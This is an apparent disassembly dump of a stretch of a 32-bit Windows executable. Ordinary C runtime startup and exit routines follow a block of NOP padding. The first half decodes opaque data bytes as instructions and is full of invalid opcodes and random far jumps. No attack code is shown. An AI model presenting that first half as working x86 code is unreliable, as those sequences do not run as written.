  4224a0:	test   BYTE PTR [ebx+0x17],bl
  4224a3:	scas   eax,DWORD PTR es:[edi]
  4224a4:	inc    edi
  4224a5:	and    al,0x88
  4224a7:	ficomp WORD PTR [ebp+0x10]
  4224aa:	icebp  
  4224ab:	lahf   
  4224ac:	adc    eax,0x5425bb18
  4224b1:	jmp    0x5b37:0xbc49b318
  4224b8:	(bad)  
  4224b9:	arpl   WORD PTR [ecx-0x5],bx
  4224bc:	mov    edx,0x6169db12
  4224c1:	or     BYTE PTR [edi-0x1c],0x4c
  4224c5:	mov    ebp,DWORD PTR [ecx+edx*4]
  4224c8:	jl     0x422511
  4224ca:	in     al,0x27
  4224cc:	and    eax,0xa2e4b28f
  4224d1:	icebp  
  4224d2:	int    0x90
  4224d4:	int    0xe5
  4224d6:	mov    al,0xa5
  4224d8:	rcl    DWORD PTR [eax+0x6d42bb4d],cl
  4224de:	mov    ?,WORD PTR [esi+0x18a1a95d]
  4224e4:	std    
  4224e5:	mov    ds:0x6289b536,al
  4224ea:	idiv   DWORD PTR [edi]
  4224ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224ed:	aam    0xe4
  4224ef:	ins    DWORD PTR es:[edi],dx
  4224f0:	mov    ch,0x8e
  4224f2:	nop
  4224f3:	mov    dh,0x7d
  4224f5:	fdivr  QWORD PTR [esi]
  4224f7:	ja     0x4224f2
  4224f9:	push   0x575170f9
  4224fe:	pop    esi
  4224ff:	mov    esp,0xee7957
  422504:	pop    ecx
  422505:	or     al,0x6f
  422507:	aas    
  422508:	pop    ds
  422509:	push   ecx
  42250a:	stos   DWORD PTR es:[edi],eax
  42250b:	push   eax
  42250c:	jl     0x4224f9
  42250e:	mov    bl,0x59
  422510:	mov    ah,0x4b
  422512:	dec    ebx
  422513:	ret    
  422514:	mov    ebx,0x1832a286
  422519:	mov    WORD PTR [eax+0x48],gs
  42251c:	push   edx
  42251d:	mov    ah,0x9a
  42251f:	rcl    DWORD PTR [esi+0x6ead6868],1
  422525:	fild   DWORD PTR [ecx-0x4f]
  422528:	mov    edi,DWORD PTR [esi]
  42252a:	dec    eax
  42252b:	xor    eax,0x8a029138
  422530:	jbe    0x42257f
  422532:	adc    ecx,esi
  422534:	(bad)  
  422535:	jg     0x4225a0
  422537:	out    0xce,al
  422539:	test   eax,0x571c8422
  42253e:	mov    eax,ds:0xc7fac9ed
  422543:	pop    edx
  422544:	pop    eax
  422545:	adc    al,0xae
  422547:	sar    BYTE PTR [edi],1
  422549:	xchg   ecx,eax
  42254a:	lods   al,BYTE PTR ds:[esi]
  42254b:	dec    ebx
  42254c:	aam    0xfb
  42254e:	sbb    al,0x26
  422550:	stos   DWORD PTR es:[edi],eax
  422551:	mov    dl,0xf9
  422553:	out    dx,eax
  422554:	or     ebp,DWORD PTR [ebx]
  422556:	pop    ebx
  422557:	dec    ebx
  422558:	ret    0xe4c7
  42255b:	inc    edi
  42255c:	cmp    edx,eax
  42255e:	push   cs
  42255f:	lahf   
  422560:	adc    esp,esi
  422562:	jmp    0xbc11:0x449a3ecc
  422569:	(bad)  
  42256a:	add    eax,0xbef34de
  42256f:	sbb    eax,0x6078b2aa
  422574:	(bad)  
  422575:	jmp    0x196bb5a1
  42257a:	pop    es
  42257b:	lods   eax,DWORD PTR ds:[esi]
  42257c:	mov    ds:0x99372f22,eax
  422581:	popaw  
  422583:	push   eax
  422584:	mov    dh,0x4f
  422586:	xor    ebp,esp
  422588:	outs   dx,DWORD PTR ds:[esi]
  422589:	fld1   
  42258b:	ror    DWORD PTR [esi-0x30],1
  42258e:	pusha  
  42258f:	lock sti 
  422591:	std    
  422592:	pop    eax
  422593:	enter  0x86ea,0x1f
  422597:	xchg   esi,eax
  422598:	adc    BYTE PTR [eax-0x71],cl
  42259b:	test   BYTE PTR [esi],ch
  42259d:	retf   0x27df
  4225a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225a1:	xchg   DWORD PTR [esi-0x2d5ef49b],esi
  4225a7:	push   esp
  4225a8:	in     al,dx
  4225a9:	data16 (bad) 
  4225ac:	lods   eax,DWORD PTR ds:[esi]
  4225ad:	adc    eax,0x45d59add
  4225b2:	and    al,bh
  4225b4:	xor    DWORD PTR [edx+0x9],esi
  4225b7:	sbb    DWORD PTR [ebp+ebx*2+0x38],edi
  4225bb:	cwde   
  4225bc:	sub    al,al
  4225be:	sub    eax,0xa3190cb1
  4225c3:	cmp    edx,DWORD PTR [edi-0x74]
  4225c6:	sub    DWORD PTR [edx+0x7b],edx
  4225c9:	fdiv   st,st(4)
  4225cb:	and    eax,0x8cb472aa
  4225d0:	dec    ebx
  4225d1:	dec    eax
  4225d2:	dec    ebx
  4225d3:	xlat   BYTE PTR ds:[ebx]
  4225d4:	mov    ebp,0xe78a7a22
  4225d9:	pop    edi
  4225da:	pop    eax
  4225db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225dc:	in     al,0x5f
  4225de:	cmp    BYTE PTR [ebx],bh
  4225e0:	fistp  WORD PTR [edx-0x27]
  4225e3:	fcom   st(6)
  4225e5:	cmp    BYTE PTR [edi-0x3b205979],bl
  4225eb:	and    BYTE PTR [ecx+0x68],ah
  4225ee:	and    al,0x9d
  4225f0:	push   esp
  4225f1:	loope  0x422597
  4225f3:	scas   al,BYTE PTR es:[edi]
  4225f4:	cs (bad) 
  4225f6:	and    bl,bh
  4225f8:	(bad)  
  4225f9:	pop    ss
  4225fa:	xor    eax,0xdd528cfd
  4225ff:	scas   eax,DWORD PTR es:[edi]
  422600:	stos   DWORD PTR es:[edi],eax
  422601:	mov    ebp,DWORD PTR [edi-0x53]
  422604:	sahf   
  422605:	or     DWORD PTR [eax-0x5ad94615],ebp
  42260b:	or     eax,0x241875a7
  422610:	or     DWORD PTR [esi+0x5],ecx
  422613:	adc    eax,0x9dbfb153
  422618:	mov    esi,DWORD PTR [ebx+eiz*1+0x35ece616]
  42261f:	and    DWORD PTR [ebp+esi*8-0x66],esp
  422623:	dec    esp
  422624:	and    eax,0x6046ee7d
  422629:	fcom   DWORD PTR [edx]
  42262b:	adc    al,0x3c
  42262d:	dec    esi
  42262e:	push   ecx
  42262f:	push   esp
  422630:	jb     0x422618
  422632:	hlt    
  422633:	mov    BYTE PTR [eax+0x7acba871],ch
  422639:	xchg   esp,eax
  42263a:	xchg   ecx,eax
  42263b:	cmp    BYTE PTR [edi-0x415d098c],bl
  422641:	addr16 call 0xfc5e:0x24561917
  422649:	mov    al,0x16
  42264b:	add    edi,DWORD PTR [esi-0x75]
  42264e:	adc    BYTE PTR [esi-0x764ba40],dh
  422654:	add    al,BYTE PTR [eax-0x1c]
  422657:	sahf   
  422658:	les    ecx,FWORD PTR [eax+0x67]
  42265b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42265c:	clc    
  42265d:	sub    DWORD PTR [eax+0x73488e9f],ebx
  422663:	or     bh,BYTE PTR [edx-0x6beee98b]
  422669:	mov    esp,DWORD PTR [esi-0xdbe4fe]
  42266f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422670:	icebp  
  422671:	and    BYTE PTR [edx-0x24],ah
  422674:	adc    al,0x23
  422676:	mov    WORD PTR [edx+0x36711b83],?
  42267c:	jg     0x422656
  42267e:	int    0x99
  422680:	jecxz  0x4226c3
  422682:	test   ecx,ebp
  422684:	and    dh,BYTE PTR [esi-0x3a0fad80]
  42268a:	push   eax
  42268b:	mov    esi,0x96d3d35f
  422690:	and    eax,DWORD PTR [edi]
  422692:	pop    ebp
  422693:	and    esp,DWORD PTR [edx+0x7b]
  422696:	mov    edi,0x3450bb90
  42269b:	fs mov edi,0x99466ee6
  4226a1:	xlat   BYTE PTR ds:[ebx]
  4226a2:	jge    0x4226ac
  4226a4:	push   0x8942a5d0
  4226a9:	call   0x5634:0x5518ee78
  4226b0:	data16 jns 0x42267f
  4226b3:	sub    al,0xf2
  4226b5:	adc    bl,BYTE PTR [ecx+0x17]
  4226b8:	in     eax,0x10
  4226ba:	or     eax,DWORD PTR [ecx+0x50ece19c]
  4226c0:	iret   
  4226c1:	cmp    al,0x5f
  4226c3:	cdq    
  4226c4:	out    dx,eax
  4226c5:	js     0x42273b
  4226c7:	xchg   esp,eax
  4226c8:	cmp    al,0xa2
  4226ca:	mov    edi,0xa418688b
  4226cf:	xor    DWORD PTR [ecx+edx*2+0x3a],0x6c
  4226d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226d5:	nop
  4226d6:	clc    
  4226d7:	sbb    al,0xcf
  4226d9:	sub    ebp,esi
  4226db:	jbe    0x4226fe
  4226dd:	push   0xcff68c2c
  4226e2:	jb     0x4226e5
  4226e4:	cmp    DWORD PTR [ecx-0x181d9db4],ecx
  4226ea:	inc    ebp
  4226eb:	imul   edx,DWORD PTR ss:[ecx],0x803b719f
  4226f2:	repnz sbb al,0x5d
  4226f5:	in     al,dx
  4226f6:	ret    0x2f75
  4226f9:	sbb    bl,ah
  4226fb:	rcl    DWORD PTR [eax-0x6e],cl
  4226fe:	sub    eax,0x920e2f85
  422703:	fs mov eax,0x39b96a70
  422709:	mov    dh,0x58
  42270b:	sub    al,0xe0
  42270d:	sbb    DWORD PTR [esi-0x1bdc8125],ebx
  422713:	or     DWORD PTR [ebx+0x6cf05047],ebp
  422719:	push   eax
  42271a:	add    al,0x43
  42271c:	aas    
  42271d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42271e:	inc    edx
  42271f:	pop    ecx
  422720:	imul   esp,ecx,0xffffff88
  422723:	add    bh,al
  422725:	mov    edi,0x8738fe21
  42272a:	cmc    
  42272b:	or     al,0xf2
  42272d:	push   sp
  42272f:	jge    0x42277e
  422731:	xor    dl,BYTE PTR [ebp-0x40]
  422734:	dec    edi
  422735:	or     bl,BYTE PTR [eax+edi*1-0x47]
  422739:	push   eax
  42273a:	int3   
  42273b:	fbld   TBYTE PTR [esi+0x10]
  42273e:	sub    BYTE PTR [eax+0x7e],al
  422741:	jno    0x422758
  422743:	fistp  DWORD PTR [esp+ecx*4]
  422746:	push   edi
  422747:	pop    ecx
  422748:	mov    eax,ds:0x3a5a35d8
  42274d:	mov    dh,0xa0
  42274f:	iret   
  422750:	mov    ebp,0xdf24cc90
  422755:	aam    0xa4
  422757:	(bad)  
  422758:	xchg   esi,eax
  422759:	mov    al,ds:0x87d977d2
  42275e:	in     eax,dx
  42275f:	mov    edi,0xd63de136
  422764:	int    0x91
  422766:	pop    esi
  422767:	push   ecx
  422768:	sti    
  422769:	inc    edx
  42276a:	pop    ecx
  42276b:	pop    ecx
  42276c:	push   cs
  42276d:	fstp   DWORD PTR [esi+eiz*8+0x50622839]
  422774:	(bad)  
  422777:	adc    ch,cl
  422779:	sbb    DWORD PTR [ebp+0x45],edx
  42277c:	sbb    DWORD PTR ds:0x2c983b4e,eax
  422782:	sbb    eax,0xbb8311c2
  422787:	cld    
  422788:	daa    
  422789:	cmp    al,0xca
  42278b:	xchg   edi,eax
  42278c:	js     0x42280c
  42278e:	in     al,0xad
  422790:	inc    eax
  422791:	push   es
  422792:	jo     0x422790
  422794:	mov    ch,0x4b
  422796:	lock ins BYTE PTR es:[edi],dx
  422798:	cld    
  422799:	(bad)  
  42279a:	ror    dl,0xb3
  42279d:	lahf   
  42279e:	js     0x42278d
  4227a0:	ret    0xc13d
  4227a3:	stos   DWORD PTR es:[edi],eax
  4227a4:	adc    BYTE PTR [ebx],0x78
  4227a7:	add    DWORD PTR [edi],esi
  4227a9:	mov    al,ds:0xfc4dd3a6
  4227ae:	hlt    
  4227af:	shr    BYTE PTR [edi-0x2f],0x94
  4227b3:	scas   eax,DWORD PTR es:[edi]
  4227b4:	(bad)  [esi+0xd08b625]
  4227ba:	inc    edx
  4227bb:	mov    ah,0x71
  4227bd:	adc    BYTE PTR [esi+0x17],ah
  4227c0:	popf   
  4227c1:	dec    edi
  4227c2:	mov    dl,0x6f
  4227c4:	iret   
  4227c5:	popf   
  4227c6:	mov    ebx,0xb1bf942
  4227cb:	imul   ebx,ebx,0xd
  4227ce:	mov    ds:0x5ba46fae,al
  4227d3:	inc    edi
  4227d4:	clc    
  4227d5:	rol    BYTE PTR [ecx],cl
  4227d7:	lods   eax,DWORD PTR ds:[esi]
  4227d8:	es xchg ecx,eax
  4227da:	push   esp
  4227db:	enter  0x8497,0xc9
  4227df:	scas   eax,DWORD PTR es:[edi]
  4227e0:	push   edi
  4227e1:	in     eax,dx
  4227e2:	jmp    0x4227dc
  4227e4:	stc    
  4227e5:	lods   al,BYTE PTR ds:[esi]
  4227e6:	push   edi
  4227e7:	mov    cl,0xfa
  4227e9:	into   
  4227ea:	cli    
  4227eb:	push   ds
  4227ec:	loope  0x4227c0
  4227ee:	(bad)  
  4227ef:	repz xor DWORD PTR [eax+esi*8+0x448ad441],esi
  4227f7:	lods   eax,DWORD PTR ds:[esi]
  4227f8:	neg    eax
  4227fa:	mov    dl,0xdd
  4227fc:	shl    BYTE PTR [eax+edi*4],0xc2
  422800:	into   
  422801:	mov    dh,0x77
  422803:	mov    BYTE PTR [eax+0x30],bl
  422806:	mov    ebp,0x5790469d
  42280b:	(bad)  [ecx+0x2b]
  42280e:	icebp  
  42280f:	les    ecx,FWORD PTR [esi-0x72]
  422812:	jge    0x422868
  422814:	ins    BYTE PTR es:[edi],dx
  422815:	clc    
  422816:	stos   DWORD PTR es:[edi],eax
  422817:	mov    BYTE PTR [eax-0x3145c6dd],ch
  42281d:	fbld   TBYTE PTR [esi+ecx*8+0x7ef2748a]
  422824:	fcmovnbe st,st(6)
  422826:	push   0x6b
  422828:	ins    BYTE PTR es:[edi],dx
  422829:	push   ebx
  42282a:	jge    0x422849
  42282c:	ret    0x45fd
  42282f:	or     ah,BYTE PTR [edx+edi*4]
  422832:	adc    al,0xd1
  422834:	sub    al,0x8f
  422836:	mov    esi,0xd96e0e89
  42283b:	xor    al,0x8e
  42283d:	fld    TBYTE PTR [edi]
  42283f:	push   ebx
  422840:	push   es
  422841:	mov    ch,0x1a
  422843:	pop    ss
  422844:	into   
  422845:	and    al,0x38
  422847:	fadd   st,st(0)
  422849:	retf   0xc4a2
  42284c:	mov    eax,ds:0x576ea43b
  422851:	add    al,0xe2
  422853:	adc    al,0x48
  422855:	jmp    0xd3e9:0x48142e42
  42285c:	mov    WORD PTR [esi],es
  42285e:	div    BYTE PTR [ecx]
  422860:	aas    
  422861:	inc    ebx
  422862:	lds    ecx,FWORD PTR [ebx+0x1f]
  422865:	pushf  
  422866:	mov    al,ds:0xd3a076c
  42286b:	leave  
  42286c:	icebp  
  42286d:	xor    al,0x4d
  42286f:	out    dx,eax
  422870:	dec    esp
  422871:	(bad)  
  422873:	data16 sti 
  422875:	arpl   WORD PTR ds:0x9f9ab3a5,bx
  42287b:	retf   
  42287c:	shl    BYTE PTR [esi*8-0x60f6b7a8],1
  422883:	mov    edi,0x6f15d3e7
  422888:	sub    dl,dh
  42288a:	xchg   edi,eax
  42288b:	push   ss
  42288c:	out    dx,eax
  42288d:	call   0x768f:0x72dcca8
  422894:	pushf  
  422895:	fwait
  422896:	inc    esp
  422897:	inc    ebp
  422898:	mov    cl,0x63
  42289a:	jl     0x422835
  42289c:	es imul edx,ecx,0xffffffde
  4228a0:	sbb    al,0x73
  4228a2:	or     al,0xd9
  4228a4:	mov    ch,0x89
  4228a6:	xchg   DWORD PTR [ebx+0x2e],ecx
  4228a9:	mov    ch,0xbe
  4228ab:	sub    esp,ecx
  4228ad:	xor    al,0xfe
  4228af:	jb     0x422866
  4228b1:	mov    edx,0x2391b6ed
  4228b6:	xor    eax,0x5b53da6
  4228bb:	push   ebx
  4228bc:	inc    edx
  4228bd:	cli    
  4228be:	xchg   edx,eax
  4228bf:	pop    ecx
  4228c0:	loopne 0x422935
  4228c2:	xchg   ecx,eax
  4228c3:	xor    eax,0xcc1d3a85
  4228c8:	mov    ebp,0xd533e779
  4228cd:	popa   
  4228ce:	in     al,dx
  4228cf:	jnp    0x4228ab
  4228d1:	jns    0x422876
  4228d3:	mov    ebx,eax
  4228d5:	inc    ebx
  4228d6:	jb     0x422862
  4228d8:	in     eax,dx
  4228d9:	adc    esp,esp
  4228db:	cmp    BYTE PTR [ecx],bl
  4228dd:	mov    eax,0xea0f3906
  4228e2:	inc    edx
  4228e3:	xchg   ebp,eax
  4228e4:	cmc    
  4228e5:	sub    eax,0xc6f42a51
  4228ea:	push   0xd
  4228ec:	test   DWORD PTR [ecx-0x377dfc1],eax
  4228f2:	ret    0x22f8
  4228f5:	js     0x4228ce
  4228f7:	push   es
  4228f8:	push   ds
  4228f9:	ficomp DWORD PTR [ebx+0x5e136dbb]
  4228ff:	in     al,0xee
  422901:	(bad)  
  422902:	sub    esp,DWORD PTR [edi+edx*2]
  422905:	and    ebp,DWORD PTR [edi+0x11]
  422908:	in     al,dx
  422909:	dec    esp
  42290a:	inc    eax
  42290b:	fisub  WORD PTR [eax]
  42290d:	or     DWORD PTR [edx],0xbc8ef3db
  422913:	mov    edi,0xc034a982
  422918:	push   eax
  422919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42291a:	nop
  42291b:	dec    ecx
  42291c:	push   ebx
  42291d:	cmp    dh,dl
  42291f:	mov    edx,0x63c8c1ac
  422924:	push   edi
  422925:	sub    al,0xdb
  422927:	inc    esp
  422928:	mov    DWORD PTR [edx-0x43d503af],esi
  42292e:	sbb    DWORD PTR [esi+0x7f6fb24d],ebx
  422934:	pop    ds
  422935:	call   0x3c9d:0x9f15c29
  42293c:	mov    dl,BYTE PTR [eax]
  42293e:	mov    cl,BYTE PTR [edx+0x54]
  422941:	push   es
  422942:	dec    edx
  422943:	mov    cl,0x5c
  422945:	push   0x5e
  422947:	stc    
  422948:	test   eax,0x32b56ed
  42294d:	nop
  42294e:	push   edi
  42294f:	push   ecx
  422950:	out    0x9f,eax
  422952:	out    dx,al
  422953:	loope  0x422983
  422955:	lods   al,BYTE PTR ds:[esi]
  422956:	(bad)  
  422957:	fnstsw WORD PTR [edx-0x7c3fcc28]
  42295d:	les    edx,FWORD PTR [eax]
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
